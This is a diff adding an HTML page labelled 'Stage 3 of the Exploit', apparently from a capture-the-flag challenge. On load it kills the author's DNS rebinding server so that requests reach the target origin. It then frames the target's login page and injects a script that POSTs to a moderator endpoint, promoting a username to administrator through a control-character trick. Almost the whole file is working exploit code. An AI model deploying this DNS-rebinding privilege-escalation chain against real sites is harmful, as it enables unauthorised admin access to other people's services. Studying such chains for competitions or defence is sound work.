@@ -1,0 +1,45 @@
+<html>
+    <head>Stage 3 of the Exploit</head>
+    <script>
+        const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+        function injectFunc(){
+            fetch("/moderator/promote", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ username: "<%= username %>", permission: "\u001administrator"})
+                }
+            ).then(e=>console.log(e.text()))
+        }
+
+        function injectScript(frame) {
+            let doc = frame.contentDocument || frame.contentWindow.document
+            let iframe = document.createElement("iframe")
+            iframe.srcdoc = `<script>${injectFunc.toString()}; injectFunc()<\x2fscript>`
+            doc.body.append(iframe)
+        }
+
+        async function pwn(){
+            /**
+             * This fetch will kill our DNS Rebinding server.
+             * This is because we need to perform the request in same-origin with the challenge IP.
+             * By killing our server, the request will go to the other A Record (which is the challenge URL).
+             * Once again maybe we need to saturate the cache with some dummy fetch.
+             * Then we can inject a script into the iframe.
+            */
+            fetch("/bye")
+            for (let i = 0; i < 50; i++) {
+                await sleep(100);
+            }
+            var frame = document.getElementById("frame")
+            frame.src = window.location+"/../../login"
+            await sleep(500)
+            injectScript(frame)
+        }
+    </script>
+    <body onload="pwn()">
+        <iframe id="frame"></iframe>
+    </body>
+</html>
